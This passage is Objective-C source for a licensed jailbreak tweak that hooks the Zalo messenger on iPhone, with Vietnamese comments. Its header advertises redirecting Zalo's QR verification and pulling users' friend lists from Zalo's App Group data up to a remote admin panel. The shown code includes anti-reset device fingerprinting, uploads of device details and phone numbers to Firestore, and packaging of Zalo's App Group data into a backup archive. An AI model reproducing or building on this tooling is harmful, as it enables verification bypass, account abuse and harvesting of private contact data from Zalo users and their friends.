/**
 * ==============================================================================
 * TWEAK CLANGG - ZALO SEQ REDIRECT & HỆ THỐNG ACTIVE LICENSE KEY TRÊN IPHONE
 * Tác giả: clang | Version: 1.3.0
 * ==============================================================================
 * Tính năng chính:
 * 1. Popup nhập Mã Key (License Key) lần đầu trên iPhone khi mở Zalo.
 * 2. Lưu Key và installation ID trong iOS Keychain (ThisDeviceOnly).
 * 3. Xác thực Cloud DRM với Firebase: fingerprint v2, CAS binding và kiểm tra hạn dùng.
 * 4. Chuyển hướng xác minh QR sang SEQ (Xác thực bạn bè).
 * 5. Tự động trích xuất danh bạ bạn bè từ App Group và đẩy thẳng lên Web Admin.
 * ==============================================================================
 */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <CommonCrypto/CommonDigest.h>
#import <CommonCrypto/CommonHMAC.h>
#import <sys/utsname.h>
#import <zlib.h>
#import <stdatomic.h>

static NSString *const kFirebaseProjectId = @"seq-qr";
static NSString *const kPrefLicenseKey = @"kClanggLicenseKey_v1";
static NSString *const kKeychainService = @"com.clang.clangg.secure-license";
static NSString *const kKeychainLicenseAccount = @"license-key";
static NSString *const kKeychainInstallAccount = @"installation-id";

// Prototype declarations
static NSString *getDeviceUUID(void);
static NSString *getSavedLicenseKey(void);
static void saveLicenseKeyPermanently(NSString *key);
static void removeLicenseKeyPermanently(void);
static void showSecurityAlert(NSString *title, NSString *message);
static void showSecurityAlertWithRetry(NSString *title, NSString *message, void (^onRetry)(void));
static void promptForLicenseKey(void (^onSuccess)(NSString *validKey));
static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void));
static void autoSyncFriendsToFirebase(NSString *phoneStr, void (^onSuccess)(void), void (^onError)(NSError *error));
static void checkLicenseOnStartup(void);
static void handleZaloLogout(void);
static void clearPolicyFromDisk(void);
static void savePolicyToDisk(NSString *policy, NSArray *allowedPhones);
static void loadCachedPolicyFromDisk(void);
static NSString *computePolicyHMAC(NSString *deviceUUID, NSString *key, NSString *policy, NSArray *allowedPhones);

// ==============================================================================
// GLOBAL TWEAK STATE  (khai báo trước mọi hàm để tránh undeclared-identifier)
//
// g_tweakEnabled        : YES chỉ sau khi verify + whitelist đểu pass hoàn toàn.
//                         Tất cả hook kiểm tra flag này trước khi hành động.
// g_cachedPhonePolicy   : giá trị "unlimited" hoặc "whitelist", lưu từ UserDefaults
//                         vào mỗi lần verify thành công. Dùng để quyết định fail-open.
// g_cachedAllowedPhones  : danh sách SĐT được phép (normalized 0xxxxxxx).
// g_isVerifyingInFlight : atomic guard chống gửi nhiều request verify đồng thời.
// g_isSyncingInFlight   : atomic guard chống gửi nhiều request sync danh bạ cùng lúc.
// ==============================================================================
static BOOL         g_tweakEnabled         = NO;
static NSString    *g_cachedPhonePolicy    = nil;
static NSArray     *g_cachedAllowedPhones  = nil;
static atomic_bool  g_isVerifyingInFlight  = false;
static atomic_bool  g_isSyncingInFlight    = false;

// Helper: tính mã chữ ký HMAC-SHA256 ràng buộc thiết bị + key + policy + whitelist
static NSString *computePolicyHMAC(NSString *deviceUUID, NSString *key, NSString *policy, NSArray *allowedPhones) {
    if (!deviceUUID || !key || !policy) return nil;
    NSArray *sortedPhones = allowedPhones ? [allowedPhones sortedArrayUsingSelector:@selector(compare:)] : @[];
    NSString *phonesStr = [sortedPhones componentsJoinedByString:@","];
    NSString *secretSalt = @"ClanggDRM_Sec_Salt_2026!#99x";
    NSString *payload = [NSString stringWithFormat:@"%@|%@|%@|%@|%@", deviceUUID, key, policy, phonesStr, secretSalt];

    unsigned char cHMAC[CC_SHA256_DIGEST_LENGTH];
    CCHmac(kCCHmacAlgSHA256, [secretSalt UTF8String], [secretSalt lengthOfBytesUsingEncoding:NSUTF8StringEncoding],
           [payload UTF8String], [payload lengthOfBytesUsingEncoding:NSUTF8StringEncoding], cHMAC);

    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
        [hex appendFormat:@"%02x", cHMAC[i]];
    }
    return hex;
}

// Helper: tải policy đã lưu từ lần verify trước, BẮT BUỘC kiểm tra chữ ký HMAC
static void loadCachedPolicyFromDisk(void) {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    NSString *policy = [ud stringForKey:@"kClanggCachedPolicy"];
    NSString *hmac = [ud stringForKey:@"kClanggCachedPolicyHMAC"];
    NSArray *phones = [ud arrayForKey:@"kClanggCachedAllowedPhones"];
    
    NSString *savedKey = [getSavedLicenseKey() uppercaseString];
    NSString *deviceUUID = getDeviceUUID();

    if (policy && hmac && savedKey && deviceUUID) {
        NSString *expectedHMAC = computePolicyHMAC(deviceUUID, savedKey, policy, phones);
        if (expectedHMAC && [hmac isEqualToString:expectedHMAC]) {
            g_cachedPhonePolicy = [policy copy];
            g_cachedAllowedPhones = phones ? [phones copy] : nil;
            return;
        }
    }

    // Chữ ký không khớp hoặc bị sửa đổi trái phép bằng Filza/Plist editor -> Hủy bỏ cache ngay lập tức
    clearPolicyFromDisk();
    g_cachedPhonePolicy = nil;
    g_cachedAllowedPhones = nil;
}

// Helper: lưu policy lên disk kèm chữ ký HMAC mật mã
static void savePolicyToDisk(NSString *policy, NSArray *allowedPhones) {
    if (!policy) {
        clearPolicyFromDisk();
        return;
    }
    NSString *savedKey = [getSavedLicenseKey() uppercaseString];
    NSString *deviceUUID = getDeviceUUID();
    NSString *hmac = computePolicyHMAC(deviceUUID, savedKey, policy, allowedPhones);

    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setObject:policy forKey:@"kClanggCachedPolicy"];
    if (allowedPhones) {
        [ud setObject:allowedPhones forKey:@"kClanggCachedAllowedPhones"];
    } else {
        [ud removeObjectForKey:@"kClanggCachedAllowedPhones"];
    }
    if (hmac) {
        [ud setObject:hmac forKey:@"kClanggCachedPolicyHMAC"];
    }
    [ud synchronize];
}

// Helper: xóa policy đã lưu (khi key bị xóa/khóa).
static void clearPolicyFromDisk(void) {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud removeObjectForKey:@"kClanggCachedPolicy"];
    [ud removeObjectForKey:@"kClanggCachedAllowedPhones"];
    [ud removeObjectForKey:@"kClanggCachedPolicyHMAC"];
    [ud synchronize];
    g_cachedPhonePolicy = nil;
    g_cachedAllowedPhones = nil;
}

// Normalize phone sang dạng 0xxxxxxxx.
static NSString *normalizePhone(NSString *phone) {
    if (!phone) return @"";
    NSString *d = [[phone componentsSeparatedByCharactersInSet:
        [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
    if ([d hasPrefix:@"84"] && d.length >= 10) d = [@"0" stringByAppendingString:[d substringFromIndex:2]];
    else if (![d hasPrefix:@"0"] && d.length >= 9) d = [@"0" stringByAppendingString:d];
    return d;
}

// Kiểm tra SĐT có trong whitelist hiện tại không.
// Logic chính xác:
//   - policy = nil (chưa biết)      → Từ chối (chưa xong verify)
//   - policy = "unlimited"           → Chấp nhận mọi SĐT
//   - policy = "whitelist" + rỗng    → Từ chối (whitelist nghịch đảo không hợp lệ)
//   - policy = "whitelist" + có SĐT  → Chỉ chấp nhận SĐT trong danh sách
static BOOL isPhoneAllowedByWhitelist(NSString *phone) {
    // Chưa verify được policy → luôn từ chối
    if (!g_cachedPhonePolicy) return NO;
    // Unlimited: chấp nhận mọi SĐT hợp lệ
    if ([g_cachedPhonePolicy isEqualToString:@"unlimited"]) {
        return (phone && phone.length >= 8);
    }
    // Whitelist: danh sách rỗng = từ chối tất cả
    if (!g_cachedAllowedPhones || g_cachedAllowedPhones.count == 0) return NO;
    // Kiểm tra SĐT có trong danh sách
    NSString *norm = normalizePhone(phone);
    return (norm.length >= 9 && [g_cachedAllowedPhones containsObject:norm]);
}

// Lấy thông tin chi tiết dòng máy iPhone (Ví dụ: iPhone 13 Pro Max, iPhone 11...)
static NSString *getDeviceModelName(void) {
    struct utsname systemInfo;
    uname(&systemInfo);
    NSString *code = [NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding];
    
    NSDictionary *models = @{
        @"iPhone10,1": @"iPhone 8", @"iPhone10,4": @"iPhone 8",
        @"iPhone10,2": @"iPhone 8 Plus", @"iPhone10,5": @"iPhone 8 Plus",
        @"iPhone10,3": @"iPhone X", @"iPhone10,6": @"iPhone X",
        @"iPhone11,8": @"iPhone XR",
        @"iPhone11,2": @"iPhone XS", @"iPhone11,4": @"iPhone XS Max", @"iPhone11,6": @"iPhone XS Max",
        @"iPhone12,1": @"iPhone 11", @"iPhone12,3": @"iPhone 11 Pro", @"iPhone12,5": @"iPhone 11 Pro Max",
        @"iPhone12,8": @"iPhone SE (2nd gen)",
        @"iPhone13,1": @"iPhone 12 mini", @"iPhone13,2": @"iPhone 12", @"iPhone13,3": @"iPhone 12 Pro", @"iPhone13,4": @"iPhone 12 Pro Max",
        @"iPhone14,4": @"iPhone 13 mini", @"iPhone14,5": @"iPhone 13", @"iPhone14,2": @"iPhone 13 Pro", @"iPhone14,3": @"iPhone 13 Pro Max",
        @"iPhone14,6": @"iPhone SE (3rd gen)",
        @"iPhone14,7": @"iPhone 14", @"iPhone14,8": @"iPhone 14 Plus", @"iPhone15,2": @"iPhone 14 Pro", @"iPhone15,3": @"iPhone 14 Pro Max",
        @"iPhone15,4": @"iPhone 15", @"iPhone15,5": @"iPhone 15 Plus", @"iPhone15,6": @"iPhone 15 Pro", @"iPhone15,7": @"iPhone 15 Pro Max"
    };

    return models[code] ?: code;
}

static NSString *getLegacyDeviceUUID(void) {
    return [[[UIDevice currentDevice] identifierForVendor] UUIDString];
}

static NSData *keychainRead(NSString *account) {
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrService: kKeychainService,
        (__bridge id)kSecAttrAccount: account,
        (__bridge id)kSecReturnData: @YES,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitOne
    };
    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &result);
    if (status != errSecSuccess || !result) return nil;
    return CFBridgingRelease(result);
}

static BOOL keychainWrite(NSString *account, NSData *data) {
    if (!account || !data) return NO;
    NSDictionary *base = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrService: kKeychainService,
        (__bridge id)kSecAttrAccount: account
    };
    SecItemDelete((__bridge CFDictionaryRef)base);
    NSMutableDictionary *item = [base mutableCopy];
    item[(__bridge id)kSecValueData] = data;
    item[(__bridge id)kSecAttrAccessible] = (__bridge id)kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly;
    return SecItemAdd((__bridge CFDictionaryRef)item, NULL) == errSecSuccess;
}

static void keychainDelete(NSString *account) {
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrService: kKeychainService,
        (__bridge id)kSecAttrAccount: account
    };
    SecItemDelete((__bridge CFDictionaryRef)query);
}

static NSString *getInstallationID(void) {
    NSData *stored = keychainRead(kKeychainInstallAccount);
    NSString *installationID = stored ? [[NSString alloc] initWithData:stored encoding:NSUTF8StringEncoding] : nil;
    if (installationID.length >= 32) return installationID;

    installationID = [[[NSUUID UUID] UUIDString] lowercaseString];
    keychainWrite(kKeychainInstallAccount, [installationID dataUsingEncoding:NSUTF8StringEncoding]);
    return installationID;
}

static NSString *sha256Hex(NSString *value) {
    NSData *data = [value dataUsingEncoding:NSUTF8StringEncoding];
    unsigned char digest[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (NSUInteger i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
        [hex appendFormat:@"%02x", digest[i]];
    }
    return hex;
}

// Fingerprint v2: Lưu cố định toàn cục trên hệ thống để sống sót qua Xoá Info / Crane / Fake Device
static NSString *getDeviceUUID(void) {
    NSArray *globalPaths = @[
        @"/var/mobile/Library/Preferences/com.clang.clangg.device_uuid.txt",
        @"/var/mobile/Library/clangg_device_uuid.txt"
    ];

    for (NSString *p in globalPaths) {
        if ([[NSFileManager defaultManager] fileExistsAtPath:p]) {
            NSString *saved = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
            if (saved) {
                saved = [saved stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
                if (saved.length >= 32) return saved;
            }
        }
    }

    struct utsname systemInfo;
    uname(&systemInfo);
    NSString *modelCode = [NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding] ?: @"iPhone";
    NSString *generated = sha256Hex([NSString stringWithFormat:@"hardware|%@|%@", [[NSUUID UUID] UUIDString], modelCode]);

    for (NSString *p in globalPaths) {
        [generated writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
    return generated;
}

// Thu thập toàn bộ thông tin chi tiết thiết bị iPhone
static NSDictionary *getFullDeviceMetadata(void) {
    UIDevice *dev = [UIDevice currentDevice];
    return @{
        @"device_id": getDeviceUUID() ?: @"Unknown",
        @"device_name": [dev name] ?: @"iPhone",
        @"device_model": getDeviceModelName() ?: [dev model],
        @"ios_version": [dev systemVersion] ?: @"iOS",
        @"last_seen": [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970]]
    };
}

// Lấy thời gian chuẩn từ Header HTTP Date của Server Firebase
static inline NSDate *getServerDate(NSHTTPURLResponse *httpResp) {
    NSString *dateHeader = httpResp.allHeaderFields[@"Date"] ?: httpResp.allHeaderFields[@"date"];
    if (dateHeader) {
        NSDateFormatter *df = [[NSDateFormatter alloc] init];
        df.locale = [[NSLocale alloc] initWithLocaleIdentifier:@"en_US_POSIX"];
        df.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"GMT"];
        df.dateFormat = @"EEE, dd MMM yyyy HH:mm:ss z";
        NSDate *sDate = [df dateFromString:dateHeader];
        if (sDate) return sDate;
    }
    return [NSDate date];
}

// Lấy Window chính của ứng dụng
static inline UIWindow *getAppKeyWindow(void) {
    UIWindow *window = nil;
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                for (UIWindow *w in scene.windows) {
                    if (w.isKeyWindow) {
                        window = w;
                        break;
                    }
                }
            }
            if (window) break;
        }
    }
    if (!window) {
        window = [UIApplication sharedApplication].keyWindow;
    }
    return window;
}

// Hiển thị thông báo Alert
static void showSecurityAlert(NSString *title, NSString *message) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = getAppKeyWindow();
        if (!window) return;
        UIViewController *rootVC = window.rootViewController;
        while (rootVC.presentedViewController) {
            rootVC = rootVC.presentedViewController;
        }

        if (rootVC) {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:title
                                                                           message:message
                                                                    preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"Đã hiểu" style:UIAlertActionStyleCancel handler:nil]];
            [rootVC presentViewController:alert animated:YES completion:nil];
        }
    });
}

// Hiển thị thông báo lỗi kèm nút Bấm Nhập Key Mới
static void showSecurityAlertWithRetry(NSString *title, NSString *message, void (^onRetry)(void)) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = getAppKeyWindow();
        if (!window) return;
        UIViewController *rootVC = window.rootViewController;
        while (rootVC.presentedViewController) {
            rootVC = rootVC.presentedViewController;
        }

        if (rootVC) {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:title
                                                                           message:message
                                                                    preferredStyle:UIAlertControllerStyleAlert];
            if (onRetry) {
                [alert addAction:[UIAlertAction actionWithTitle:@"🔑 Nhập Key Khác" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                    removeLicenseKeyPermanently();
                    onRetry();
                }]];
            }
            [alert addAction:[UIAlertAction actionWithTitle:@"Đóng" style:UIAlertActionStyleCancel handler:nil]];
            [rootVC presentViewController:alert animated:YES completion:nil];
        }
    });
}

// ==============================================================================
// QUẢN LÝ LƯU TRỮ KEY VĨNH VIỄN TOÀN CỤC TRÊN IPHONE (CHỐNG MẤT KHI XOÁ INFO / FAKE DEVICE)
// ==============================================================================
static NSArray<NSString *> *getIndestructibleKeyPaths(void) {
    return @[
        @"/var/mobile/Media/.clangg_data/license.key",
        @"/Library/Application Support/clangg/license.key",
        @"/var/jb/var/mobile/Library/Preferences/com.clang.clangg.global_key.plist",
        @"/var/mobile/Library/Preferences/com.clang.clangg.global_key.plist",
        @"/var/mobile/Library/clangg_license.key"
    ];
}

static NSString *getSavedLicenseKey(void) {
    for (NSString *p in getIndestructibleKeyPaths()) {
        if ([[NSFileManager defaultManager] fileExistsAtPath:p]) {
            NSString *k = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
            if (k) {
                k = [k stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
                if (k.length > 0) return [k uppercaseString];
            }
        }
    }

    NSData *secureData = keychainRead(kKeychainLicenseAccount);
    NSString *secureKey = secureData ? [[NSString alloc] initWithData:secureData encoding:NSUTF8StringEncoding] : nil;
    if (secureKey.length > 0) {
        saveLicenseKeyPermanently(secureKey);
        return [secureKey uppercaseString];
    }

    NSString *k = [[NSUserDefaults standardUserDefaults] stringForKey:kPrefLicenseKey];
    if (k.length > 0) {
        saveLicenseKeyPermanently(k);
        return [k uppercaseString];
    }

    return nil;
}

static void saveLicenseKeyPermanently(NSString *key) {
    if (!key) return;
    NSString *clean = [[key stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] uppercaseString];
    if (clean.length == 0) return;

    for (NSString *p in getIndestructibleKeyPaths()) {
        NSString *parentDir = [p stringByDeletingLastPathComponent];
        [[NSFileManager defaultManager] createDirectoryAtPath:parentDir withIntermediateDirectories:YES attributes:nil error:nil];
        [clean writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }

    keychainWrite(kKeychainLicenseAccount, [clean dataUsingEncoding:NSUTF8StringEncoding]);
    [[NSUserDefaults standardUserDefaults] setObject:clean forKey:kPrefLicenseKey];
    [[NSUserDefaults standardUserDefaults] synchronize];
}

static void removeLicenseKeyPermanently(void) {
    for (NSString *p in getIndestructibleKeyPaths()) {
        [[NSFileManager defaultManager] removeItemAtPath:p error:nil];
    }

    keychainDelete(kKeychainLicenseAccount);
    [[NSUserDefaults standardUserDefaults] removeObjectForKey:kPrefLicenseKey];
    [[NSUserDefaults standardUserDefaults] synchronize];
}

// Popup cho khách nhập License Key trực tiếp trên màn hình iPhone
static void promptForLicenseKey(void (^onSuccess)(NSString *validKey)) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = getAppKeyWindow();
        if (!window) return;
        UIViewController *rootVC = window.rootViewController;
        while (rootVC.presentedViewController) {
            rootVC = rootVC.presentedViewController;
        }

        if (!rootVC) return;

        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"🔑 KÍCH HOẠT BẢN QUYỀN"
                                                                       message:@"Vui lòng nhập Mã Key (License Key) được cấp để kích hoạt trên thiết bị này:"
                                                                preferredStyle:UIAlertControllerStyleAlert];
        
        [alert addTextFieldWithConfigurationHandler:^(UITextField * _Nonnull textField) {
            textField.placeholder = @"Nhập License Key (VD: KEY-NAM-8888)";
            textField.autocapitalizationType = UITextAutocapitalizationTypeAllCharacters;
            textField.clearButtonMode = UITextFieldViewModeWhileEditing;
        }];

        UIAlertAction *submitAction = [UIAlertAction actionWithTitle:@"Kích Hoạt Ngay" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
            UITextField *tf = alert.textFields.firstObject;
            NSString *inputKey = [tf.text stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
            if (inputKey.length < 3) {
                showSecurityAlert(@"Lỗi", @"Mã Key không hợp lệ!");
                return;
            }

            // Lưu key vĩnh viễn vào bộ nhớ
            saveLicenseKeyPermanently(inputKey);

            if (onSuccess) onSuccess(inputKey);
        }];

        [alert addAction:submitAction];
        [alert addAction:[UIAlertAction actionWithTitle:@"Hủy Bỏ" style:UIAlertActionStyleCancel handler:nil]];
        [rootVC presentViewController:alert animated:YES completion:nil];
    });
}

// ==============================================================================
// XÁC THỰC LICENSE KEY TRÊN CLOUD FIREBASE
// ==============================================================================
static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
    bool expected = false;
    if (!atomic_compare_exchange_strong(&g_isVerifyingInFlight, &expected, true)) {
        return;
    }

    NSString *savedKey = getSavedLicenseKey();
    
    // Nếu máy chưa có Key -> Bật Popup cho khách nhập Key
    if (!savedKey || savedKey.length == 0) {
        atomic_store(&g_isVerifyingInFlight, false);
        promptForLicenseKey(^(NSString *newKey) {
            verifyKeyAndExecute(phoneStr, onVerified);
        });
        return;
    }

    NSString *cleanKey = [savedKey uppercaseString];
    NSString *deviceUUID = getDeviceUUID();
    NSDictionary *devMeta = getFullDeviceMetadata();

    NSString *urlStr = [NSString stringWithFormat:
        @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/license_keys/%@",
        kFirebaseProjectId, cleanKey];

    NSURL *url = [NSURL URLWithString:urlStr];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url 
                                                       cachePolicy:NSURLRequestReloadIgnoringLocalCacheData 
                                                   timeoutInterval:6.0];
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req 
        completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            atomic_store(&g_isVerifyingInFlight, false);

            if (error || !data) {
                // Lỗi mạng: quyết định fail-open/closed dựa trên policy đã lưu từ lần trước
                if (g_cachedPhonePolicy && [g_cachedPhonePolicy isEqualToString:@"unlimited"]) {
                    // Policy unlimited: fail-open - cho phép chạy mà không cần xác nhận lại
                    g_tweakEnabled = YES;
                    if (onVerified) dispatch_async(dispatch_get_main_queue(), onVerified);
                } else {
                    // Chưa biết policy hoặc whitelist: fail-closed - tắt cửng bách
                    g_tweakEnabled = NO;
                }
                return;
            }

            NSHTTPURLResponse *httpResp = (NSHTTPURLResponse *)response;
            if (httpResp.statusCode == 404) {
                // Key không tồn tại
                g_tweakEnabled = NO;
                clearPolicyFromDisk();
                showSecurityAlertWithRetry(@"Key Không Tồn Tại", [NSString stringWithFormat:@"Mã Key '%@' không tồn tại trên hệ thống!", cleanKey], ^{
                    promptForLicenseKey(^(NSString *newKey) {
                        saveLicenseKeyPermanently(newKey);
                        verifyKeyAndExecute(phoneStr, onVerified);
                    });
                });
                return;
            }

            NSDate *serverTime = getServerDate(httpResp);
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            NSDictionary *fields = json[@"fields"];
            if (!fields) {
                // Dữ liệu Firebase không hợp lệ → khóa an toàn + xóa cache
                g_tweakEnabled = NO;
                clearPolicyFromDisk();
                return;
            }

            // 1. Kiểm tra status (BẮT BUỘC có và phải là "active")
            NSString *status = fields[@"status"][@"stringValue"];
            if (!status || ![status isEqualToString:@"active"]) {
                g_tweakEnabled = NO;
                clearPolicyFromDisk();
                showSecurityAlertWithRetry(@"Key Bị Tạm Khóa", @"Mã Key này không hợp lệ hoặc đã bị tạm khóa bản quyền từ xa!", ^{
                    promptForLicenseKey(^(NSString *newKey) {
                        saveLicenseKeyPermanently(newKey);
                        verifyKeyAndExecute(phoneStr, onVerified);
                    });
                });
                return;
            }

            // 2. Kiểm tra Expiry (BẮT BUỘC có, định dạng đúng, và chưa quá hạn)
            NSString *expiry = fields[@"expiry"][@"stringValue"];
            if (!expiry || expiry.length == 0) {
                g_tweakEnabled = NO;
                clearPolicyFromDisk();
                showSecurityAlert(@"Lỗi Bản Quyền", @"Dữ liệu thời hạn bản quyền không hợp lệ!");
                return;
            }

            if (![expiry isEqualToString:@"lifetime"]) {
                NSDateFormatter *df = [[NSDateFormatter alloc] init];
                [df setDateFormat:@"yyyy-MM-dd"];
                [df setTimeZone:[NSTimeZone timeZoneWithAbbreviation:@"GMT"]];
                NSDate *expDate = [df dateFromString:expiry];
                if (!expDate || [serverTime compare:expDate] == NSOrderedDescending) {
                    g_tweakEnabled = NO;
                    clearPolicyFromDisk();
                    showSecurityAlertWithRetry(@"Key Đã Hết Hạn", @"Mã Key bản quyền này đã HẾT HẠN sử dụng hoặc định dạng thời gian không hợp lệ!", ^{
                        promptForLicenseKey(^(NSString *newKey) {
                            saveLicenseKeyPermanently(newKey);
                            verifyKeyAndExecute(phoneStr, onVerified);
                        });
                    });
                    return;
                }
            }

            // 3. Kiểm tra phone_policy (BẮT BUỘC có và thuộc tập hợp "unlimited" hoặc "whitelist")
            NSString *phonePolicy = fields[@"phone_policy"][@"stringValue"];
            if (!phonePolicy || (![phonePolicy isEqualToString:@"unlimited"] && ![phonePolicy isEqualToString:@"whitelist"])) {
                g_tweakEnabled = NO;
                clearPolicyFromDisk();
                showSecurityAlert(@"Lỗi Bản Quyền", @"Chính sách bản quyền trên máy chủ không hợp lệ!");
                return;
            }

            // 4. CẬP NHẬT VÀ LƯU POLICY CACHE + HMAC XUỐNG DISK NGAY LẬP TỨC (TRƯỚC KHI CHECK PHONE)
            g_cachedPhonePolicy = [phonePolicy copy];
            if ([phonePolicy isEqualToString:@"whitelist"]) {
                NSArray *rawAllowed = fields[@"allowed_phones"][@"arrayValue"][@"values"] ?: @[];
                NSMutableArray<NSString *> *normList = [NSMutableArray array];
                for (id item in rawAllowed) {
                    NSString *p = item[@"stringValue"];
                    if (p) [normList addObject:normalizePhone(p)];
                }
                g_cachedAllowedPhones = [normList copy];
            } else {
                g_cachedAllowedPhones = nil;
            }
            savePolicyToDisk(g_cachedPhonePolicy, g_cachedAllowedPhones);

            // 5. Kiểm tra SĐT đối với policy whitelist
            if ([phonePolicy isEqualToString:@"whitelist"] && phoneStr && phoneStr.length >= 9) {
                NSString *currentNormPhone = normalizePhone(phoneStr);
                if (!g_cachedAllowedPhones || ![g_cachedAllowedPhones containsObject:currentNormPhone]) {
                    g_tweakEnabled = NO;  // SĐT ngoài whitelist → tắt toàn bộ hook
                    showSecurityAlert(@"SĐT Chưa Được Cấp Quyền",
                        [NSString stringWithFormat:@"Số %@ không nằm trong danh sách SĐT cho phép của Key này!", currentNormPhone]);
                    return;
                }
            }

            // 6. Xử lý startup (phoneStr = nil) với policy whitelist:
            //    Không bật g_tweakEnabled ngay - chưa biết SĐT hiện tại.
            //    Hook viewDidAppear sẽ detect phone rồi gọi verifyKeyAndExecute(phone)
            //    lần 2 để xác nhận whitelist và mới set g_tweakEnabled = YES.
            if ([phonePolicy isEqualToString:@"whitelist"] && (!phoneStr || phoneStr.length < 9)) {
                // g_tweakEnabled giữ = NO; onVerified không có gì quan trọng khi startup
                return;
            }

            // 6. Cập nhật thông số thiết bị / profile mới lên Cloud
            NSString *patchUrlStr = [NSString stringWithFormat:
                @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/license_keys/%@?updateMask.fieldPaths=device_id&updateMask.fieldPaths=device_name&updateMask.fieldPaths=device_model&updateMask.fieldPaths=ios_version&updateMask.fieldPaths=last_online&updateMask.fieldPaths=last_phone",
                kFirebaseProjectId, cleanKey];

            NSURL *patchUrl = [NSURL URLWithString:patchUrlStr];
            NSMutableURLRequest *pReq = [NSMutableURLRequest requestWithURL:patchUrl];
            [pReq setHTTPMethod:@"PATCH"];
            [pReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
            NSDictionary *body = @{
                @"fields": @{
                    @"device_id": @{ @"stringValue": deviceUUID },
                    @"device_name": @{ @"stringValue": devMeta[@"device_name"] ?: @"iPhone" },
                    @"device_model": @{ @"stringValue": devMeta[@"device_model"] ?: @"iPhone" },
                    @"ios_version": @{ @"stringValue": devMeta[@"ios_version"] ?: @"iOS" },
                    @"last_online": @{ @"stringValue": @"Vừa online" },
                    @"last_phone": @{ @"stringValue": phoneStr ?: @"" }
                }
            };
            [pReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:body options:0 error:nil]];
            [[[NSURLSession sharedSession] dataTaskWithRequest:pReq] resume];

            // 7. Xác thực thành công → Bật flag và tiếp tục luồng
            g_tweakEnabled = YES;
            if (onVerified) {
                dispatch_async(dispatch_get_main_queue(), onVerified);
            }
        }];
    [task resume];
}

// ==============================================================================
// ĐÓNG GÓI CHUẨN FILE ZIP .ADBK (APPS MANAGER COMPATIBLE ARCHIVE)
// ==============================================================================
static NSData *buildAdbkZipArchive(NSData *groupPlistData, NSString *phone) {
    if (!groupPlistData || groupPlistData.length == 0) return nil;

    NSString *dateStr = [[NSDate date] description];
    
    // 1. Tạo file Binfo.plist (Apps Manager Backup Information)
    NSDictionary *binfoDict = @{
        @"AppDisplayName": @"Zalo",
        @"AppPackageID": @"vn.com.vng.zingalo",
        @"BackupDate": dateStr,
        @"BackupType": @"AppGroup",
        @"PhoneNumber": phone ?: @"",
        @"ApplicationVersion": @"24.08.01"
    };
    NSData *binfoData = [NSPropertyListSerialization dataWithPropertyList:binfoDict 
                                                                   format:NSPropertyListXMLFormat_v1_0 
                                                                  options:0 
                                                                    error:nil];
    if (!binfoData) {
        binfoData = [@"<?xml version=\"1.0\" encoding=\"UTF-8\"?><plist version=\"1.0\"><dict><key>AppPackageID</key><string>vn.com.vng.zingalo</string></dict></plist>" dataUsingEncoding:NSUTF8StringEncoding];
    }

    // 2. Tạo metadata __private_info & app plist
